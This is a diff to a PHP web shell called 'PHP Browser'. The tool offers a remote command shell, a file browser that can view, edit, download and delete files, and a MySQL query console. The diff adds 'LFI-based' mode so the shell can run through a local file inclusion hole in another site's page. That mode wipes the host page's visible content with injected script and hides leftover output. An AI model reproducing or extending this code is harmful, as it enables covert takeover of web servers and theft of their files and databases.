@@ -22,6 +22,7 @@ define('PASS_HASH', '5f4dcc3b5aa765d61d8327deb882cf99'); // password   /* and re
 define('IS_WIN', substr(PHP_OS, 0, 3) == 'WIN' ? true : false);
 define('SCRIPT_NAME', str_replace('\\', '/', $_SERVER['SCRIPT_NAME']));
 define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '.')));
+define('IS_LFI_BASED', (basename(__FILE__) == basename($_SERVER['SCRIPT_NAME'])) ? false : true);
 define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? $_POST['mode'] : 'browser')));
 //date_default_timezone_set('UTC');
 
@@ -38,7 +39,11 @@ if (AUTHENT == true and !isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_A
   exit('<b><a href="">Realm</a> : Access Denied</b>');
 }
 
-$html_header = '<html><head><title>PHP Browser</title></head><body>';
+/* For LFI-based usage, hide previous page output */
+$html_header = '';
+if (IS_LFI_BASED)
+	$html_header .= '<script>document.getElementsByTagName("body")[0].innerHTML="";</script>';
+$html_header .= '<html><head><title>PHP Browser</title></head><body>';
 $html_footer = '<body></html>';
 //print_r($_SERVER);
 
@@ -201,21 +206,21 @@ if (MODE == 'shell')
 	}
 	
 	$uri = (IS_WIN ? str_replace('\\', '/', $_SERVER['SCRIPT_NAME']) : $_SERVER['SCRIPT_NAME']) . '?mode=shell' . build_params('mode');
-	$prompt_suffix = IS_WIN ? '>' : '&nbsp;$&nbsp;';
+	$prompt_suffix = IS_WIN ? '>' : '&nbsp;$';
 
-	echo $html_header . '<style>*{background-color: #333;} #vshell_output {width: 800px;height: 350px;background-color: #333;color: #fff;border: 0;margin-bottom: -1px;}
+	echo $html_header . '<style>*{background-color: #333;} body {overflow: hidden;} #vshell_output {width: 800px;height: 350px;background-color: #333;color: #fff;border: 0;margin-bottom: -1px;}
 	#vshell_cmd {width: 800px;height: 20px;display: block;border: 0;background-color: #333;color: #fff;margin: 0;padding-left: 5px;}
 	.text{ font-family: "Lucida Console", "Courrier New", monospace, sans-serif; font-size: 11px; color: #fff; }</style>
-	<textarea readonly="readonly" name="vshell_output" id="vshell_output" style="resize: none;" class="text"></textarea>
-	<table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td><span class="text" id="prompt"></span></td><td style="width: 100%;">
+	<textarea readonly="readonly" name="vshell_output" id="vshell_output" class="text" style="resize: none; width: 100%; height: 95%;"></textarea>
+	<table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td style="white-space: nowrap;"><span class="text" id="prompt"></span></td><td width="100%">
 	<input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event)" style="width: 100%; resize: none;" class="text" /></td></tr></table>
 
 	<script type="text/javascript">
 	function ReadCookie(name) { var parts = document.cookie.split(/;\s*/); for (var i=0;i<parts.length;i++)	{ if (parts[i].substring(0, 3) == name+"=") return atob(unescape(parts[i].substring(3))); } }
-	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { cmd = document.getElementById(\'vshell_cmd\').value; postMethod(cmd); return true; } else return false; }
+	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { cmd = document.getElementById(\'vshell_cmd\').value; if (cmd == "exit") window.close(); else postMethod(cmd); return true; } else return false; }
 	function updatePrompt()   { document.getElementById(\'prompt\').innerHTML = ReadCookie(\'cs\') + "'. $prompt_suffix .' "; }
 	function getHTTPObject()  { var http = false; if (typeof ActiveXObject != \'undefined\') {try { http = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { http = new ActiveXObject("Microsoft.XMLHTTP"); }	catch (E) { http = false;}}} else if (XMLHttpRequest) { try { http = new XMLHttpRequest(); }	catch (e) {http = false;}} return http;	}
-	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); var ta = document.getElementById(\'vshell_output\'); var tcmd = document.getElementById(\'vshell_cmd\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); http.setRequestHeader("Content-length", params.length); http.setRequestHeader("Connection", "close"); http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200) { ta.value += "$ "+cmd+ "\n" + http.responseText; ta.scrollTop = ta.scrollHeight; tcmd.value=""; updatePrompt() } }; http.send(params); }
+	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); var ta = document.getElementById(\'vshell_output\'); var tcmd = document.getElementById(\'vshell_cmd\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); http.setRequestHeader("Content-length", params.length); http.setRequestHeader("Connection", "close"); http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200) { ta.value += "$ "+ cmd + "\n" + http.responseText; ta.scrollTop = ta.scrollHeight; tcmd.value=""; updatePrompt() } }; http.send(params); }
 	
 	updatePrompt();
 	document.getElementById(\'vshell_cmd\').focus();
@@ -361,14 +366,19 @@ if (MODE == 'browser')
 				$val = '<a href="'. SCRIPT_NAME .'?mode=browser&d='. (substr($cwd, -1) != '/' ? $cwd : substr($cwd, 0, -1)) .'/'.
 				 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
 		}
+
+		$link_view = IS_LFI_BASED ? 'View' :     '<img src="'. SCRIPT_NAME .'?genimg=view'. build_params(array('genimg')) .'" alt="View" />';
+		$link_edit = IS_LFI_BASED ? 'Edit' :     '<img src="'. SCRIPT_NAME .'?genimg=edit'. build_params(array('genimg')) .'" alt="Edit" />';
+		$link_down = IS_LFI_BASED ? 'Download' : '<img src="'. SCRIPT_NAME .'?genimg=save'. build_params(array('genimg')) .'" alt="Download" />';
+		$link_dele = IS_LFI_BASED ? 'Delete' :   '<img src="'. SCRIPT_NAME .'?genimg=delete'. build_params(array('genimg')) .'" alt="Delete" />';
 	
 		echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
 		echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
 		echo '<td>'. (!$is_dir ? 
-			'<a target="_blank" title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
-			'<a target="_blank" title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
-			'<a title="Save" href="'. $down .'"><img src="'. SCRIPT_NAME .'?genimg=save" alt="Download" /></a> '.
-			'<a title="Delete" href="'. $dele .'"><img src="'. SCRIPT_NAME .'?genimg=delete" alt="Delete" /></a> ' : '&nbsp;');
+			'<a target="_blank" title="View" href="'. $view .'">'. $link_view .'</a> '.
+			'<a target="_blank" title="Edit" href="'. $edit .'">'. $link_edit .'</a> '.
+			'<a title="Save" href="'. $down .'">'. $link_down .'</a> '.
+			'<a title="Delete" href="'. $dele .'">'. $link_dele .'</a> ' : '&nbsp;');
 		echo '</td></tr>'. $lf;	
 	}
 	echo '</table>';
@@ -392,8 +402,7 @@ if (MODE == 'mysql')
 	{
 		$link = mysql_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass']);
 
-		if (!$link)
-			echo '<span style="color: red">Error: '. mysql_error() .'</span>';
+		if (!$link) die('<p><span style="color: red">Error: '. mysql_error() .'</span></p>');
 		
 		else
 		{
@@ -417,8 +426,10 @@ if (MODE == 'mysql')
 					$req = "SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='$db_name'";
 				else
 					$req = stripslashes(strip_tags($_POST['db_query']));
+
 				mysql_select_db($db_name, $link);
 				$res = mysql_query($req);
+				if (!$res) die('<p><span style="color: red">Error: '. mysql_error() .'</span></p>');
 				$cpt = mysql_num_rows($res);
 				$all = array('hdr' => array());
 
@@ -439,13 +450,14 @@ if (MODE == 'mysql')
 				$len = 0;
 				foreach ($all['hdr'] AS $key => $val)
 				{
-					echo sprintf("%-${val}s", $key) .' | ';
+					echo '<b>'. sprintf("%-${val}s", $key) .'</b> | ';
 					$len += $val + 3;
 				}
 				for ($i = 0; $i < $cpt; $i++)
 				{
 					echo "\n".sprintf("%'-${len}s", '-')."\n";
-					foreach ($all['hdr'] AS $key => $val) echo sprintf("%-${val}s", $all[$key][$i]) .' | ';
+					foreach ($all['hdr'] AS $key => $val)
+						echo sprintf("%-${val}s", $all[$key][$i]) .' | ';
 				}
 				echo '</pre>';
 			}
@@ -454,6 +466,9 @@ if (MODE == 'mysql')
 	}
 	echo '</form>';
 }
+
+if (IS_LFI_BASED)
+	echo '<div style="display: none;">';
 
 function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }
 
@@ -489,7 +504,7 @@ function build_params($p = array())
 	if (!is_array($p)) $p = array($p);
 	
 	$tab = isset($_SERVER['QUERY_STRING']) ? array_unique(explode('&', $_SERVER['QUERY_STRING'])) : array();
-	$script_tags = array('mode', 'portscan', 'shell', 'genimage', 'e', 'v', 's', 'd', 'l', 'r');
+	$script_tags = array('mode', 'genimg', 'e', 'v', 's', 'd', 'l', 'r');
 	
 	$ret = '';
 	foreach ($tab as $val)
@@ -505,7 +520,8 @@ function build_params($p = array())
 // Prints a line in the tree
 function print_tree_line($dir, $str, $space = '')
 {
-	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus"><img src="'. SCRIPT_NAME .'?genimg=plus" /></a>
+	$link = IS_LFI_BASED ? '[+]' : '<img src="'. SCRIPT_NAME .'?genimg=plus'. build_params(array('genimg')) .'" alt=" [+]"/>';
+	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus">'. $link .'</a>
 		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. utf8_decode($str) ."</a><br>\n";
 }
 
@@ -582,7 +598,7 @@ function display_image($img)
 		case 'plus': $img = base64_decode('R0lGODlhCQAJAPQAACkpKTIyMj8/P0NDQ1VVVWdnZ2tra3d3d35+fo6OjpOTk5iYmJ6enqSkpKmpqa+vr7Ozs7a2try8vNTU1ODg4OXl5ebm5unp6e/v7/Ly8vX19fb29vf39/v7+/z8/P///yH5BAgAAAAALAAAAAAJAAkAAAU74BSNZDRBX6p+0PNxHAJ/j9NlmfFlndNohwJhENA0GBiLR+DxfBiLC4UC2FAuC0VlW+lsFZKEeJyQhAAAOw=='); break ;
 		default: die('wrong image');
 	}
-	header('Content-Type: image/gif');
+	//header('Content-Type: image/gif');
 	echo $img;
 }
 
